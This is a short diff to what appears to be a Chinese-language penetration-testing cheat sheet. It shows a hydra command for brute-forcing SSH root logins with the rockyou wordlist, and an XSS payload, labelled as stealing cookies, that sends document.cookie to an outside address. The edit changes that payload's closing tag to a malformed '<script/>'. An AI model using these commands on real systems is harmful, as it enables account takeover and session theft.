@@ -127,7 +127,7 @@ kali> hydra -v -l root -P /usr/share/wordlists/rockyou.txt X.X.X.X ssh -t 4s
 ### XSS
 > 窃取cookie
 ```js
-<script>location.href='http://192.168.1.100/index.php?test='+document.cookie;</script>
+<script>location.href='http://192.168.1.100/index.php?test='+document.cookie;<script/>
 ```
 
 
